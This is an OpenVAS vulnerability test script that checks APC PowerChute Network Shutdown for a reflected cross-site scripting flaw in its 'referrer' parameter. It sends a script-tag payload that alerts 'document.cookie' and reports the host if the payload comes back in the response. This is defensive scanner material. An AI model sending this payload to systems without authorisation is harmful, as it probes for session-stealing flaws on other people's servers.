###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_apc_pcns_applet_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# APC PowerChute Network Shutdown 'security/applet' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in
  the context of an affected site.
  Impact Level: Application";
tag_affected = "APC PowerChute Business Edition Shutdown 6.0.0, 7.0.1 and 7.0.2.";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed
  via the 'referrer' parameter in 'security/applet', which allows attackers
  to execute arbitrary HTML and script code on the web server.";
tag_solution = "No solution or patch is available as of 30th September 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.apc.com/products/family/index.cfm?id=127";
tag_summary = "The host is running APC PowerChute Network Shutdown and is prone
  to cross site scripting vulnerability.";

if(description)
{
  script_id(902578);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)");
  script_bugtraq_id(33924);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("APC PowerChute Network Shutdown 'security/applet' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/34066");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/48973");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/501255");
  script_xref(name : "URL" , value : "http://www.dsecrg.com/pages/vul/show.php?id=82");
  script_xref(name : "URL" , value : "http://nam-en.apc.com/app/answers/detail/a_id/9539");

  script_description(desc);
  script_summary("Determine if APC PowerChute Network Shutdown is vulnerable to Cross Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 3052);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:3052);
if(!port){
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/security/loginform",  port:port);
res = http_send_recv(port:port, data:req);

## Confirm the application
if("PowerChute Business Edition" >< res)
{
  ## Construct attack request
  url = '/security/applet?referrer="><script>alert(document.cookie)</script>';

  ## Try XSS Attack and check the response to confirm vulnerability
  if(http_vuln_check(port: port, url: url, check_header: TRUE,
     pattern:"><script>alert\(document.cookie\)</script>")) {
    security_warning(port);
  }
}
